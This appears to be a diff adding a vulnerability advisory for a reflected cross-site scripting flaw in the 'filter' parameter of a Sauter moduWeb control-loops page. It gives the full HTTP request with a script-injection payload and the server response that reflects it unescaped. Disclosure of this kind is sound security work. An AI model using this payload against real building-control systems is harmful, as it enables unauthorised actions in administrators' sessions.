@@ -1,0 +1,76 @@
+The "/state/controlloops?filter=" GET Parameter is vulnerable to XSS attacks.This would result in unauthorized actions execution in the context of the authenticated user (e.g. admin). This can be used in conjuction with Social Engineering techniques.
+
+User Input Sanitization should be implemented for fixing this issue.
+
+
+Below, evidence is provided.
+
+
+Malicious Request:
+GET /state/controlloops?filter=</script><script>alert(1)</script>&slot=0 HTTP/1.1
+Host: 1.1.1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Referer: http://1.1.1.1/state/controlloops
+DNT: 1
+Connection: close
+Cookie: ksp=1442573480974026820
+Upgrade-Insecure-Requests: 1
+
+
+
+
+Response:
+HTTP/1.0 200 OK
+Connection: close
+Content-Type: text/html
+Cache-Control: no-cache
+Pragma: no-cache
+
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"> 
+ 
+<head>
+<title>Sauter moduWeb - Control loops</title>
+
+........code.........
+.....................
+
+<script type="text/javascript">
+var fnFilter = function() {
+var filter_input = document.getElementById('table_filter_input');
+if(filter_input != undefined) {
+var location = window.location.href;
+location = updateQueryStringParameter(location, 'filter', filter_input.value);		        	
+location = updateQueryStringParameter(location, 'slot', '0');
+document.location.href = location;
+}
+};
+var filterButton = document.getElementById('filter_button');
+var filterInput = document.getElementById('table_filter_input');
+if(filterButton != undefined && filterInput != undefined) {
+filterButton.onclick = fnFilter;
+filterInput.setAttribute("value", "</script><script>alert(1)</script>");
+filterInput.addEventListener("keyup", function(event) {
+event.preventDefault();
+if(event.keyCode == 13) {
+fnFilter();
+}
+});
+}
+</script>
+
+........code.........
+.....................
+
+<script type="text/javascript">
+addToPeriodicFunctions(function(handler){requestUpdate('/state/controlloops/body&filter=</script><script>alert(1)</script>','xml','tablebody', handler)});
+</script>
+
+........code.........
+.....................
+
+</html>
